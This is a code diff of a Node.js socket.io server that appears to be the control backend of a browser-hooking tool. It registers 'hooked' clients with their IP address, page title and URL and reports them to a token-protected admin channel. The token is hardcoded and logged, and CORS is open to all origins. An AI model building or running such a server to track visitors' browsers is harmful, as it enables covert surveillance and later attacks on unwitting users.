@@ -13,6 +13,7 @@ const cors = require('cors'); // Import the cors package
 const PORT = 3005;
 const SHA256 = require("crypto-js/sha256");
 const { Socket } = require("socket.io");
+const server = http.createServer(app);
 const io = require('socket.io')(server, {
     cors: {
       origin: "*",
@@ -21,10 +22,11 @@ const io = require('socket.io')(server, {
 });
 const hook = io.of("/hook");
 const admin = io.of("/admin");
-const TOKEN = "OASIS"
-const admin_conn = null;
+const TOKEN = "ZFTP-NJRM";
+var admin_conn = null;
 const verifyToken = (socket, next) => {
     const token = socket.handshake.auth.token;
+    console.log(token)
     if (!token) {
         return next(new Error('Authentication error'));
     }
@@ -35,12 +37,11 @@ const verifyToken = (socket, next) => {
     } else {
         return next(new Error('Authentication error'));
     }
-  };
-const connect = (socket, next) => {
-
 };
+
+
 admin.use(verifyToken);
-hook.use(connect);
+// hook.use(connect);
 var users = {};
 
 
@@ -48,30 +49,69 @@ app.use(cors()); // Use the cors middleware
 app.use(express.static(path.join(__dirname, 'dist')));
 
 
+
+
+
 hook.on('connection', (socket) => {
     socket.emit("message","connected");
-    users[socket.handshake.address] = {
-        "sock": socket,
-        "peer": ""
-    };
     
-    hook.on('disconnect', () => {
+    socket.on("newHook", (data) => {
+        console.log(data);
+        if (Object.keys(users).includes(data.peer)) {
+            console.log("Already hooked.");
+            return;
+        }
+        users[data.peer] = {
+            "sock": socket,
+            "address": socket.handshake.address,
+            "pageInfo": {
+                "title": data.title,
+                "url": data.page
+            }
+        };
+        if (admin_conn !== null) {
+            admin_conn.emit("hooks",getUsers())
+        }
+    })
+
+    socket.on('disconnect', () => {
         console.log(socket.handshake.address + " disconnected")
-        delete users[socket.handshake.address];
+        var pp = socket.handshake.address;
+        for (i in users) {
+            if (users[i].address == pp) {
+                delete users[i];
+            }
+        }
     })
 });
 
 admin.on('connection', (socket) => {
-    socket.emit("Admin connected");
+    socket.emit("message","Admin connected");
     admin_conn = socket;
 
-    
-    admin.on('hook', () => {
-
+    socket.on('getHooks', () => {
+        admin.emit("hooks",getUsers());
     });
     
-    admin.on('disconnect', () => {
+
+    socket.on('disconnect', () => {
         console.log("Admin disconnected");
         admin_conn = null;
     });
+});
+
+function getUsers() {
+    var gb = [];
+    for (i in users) {
+        gb.push({
+            "peer": i,
+            "ip": users[i].address,
+            "pageInfo": users[i].pageInfo
+        })
+    }
+    return gb;
+}
+
+server.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
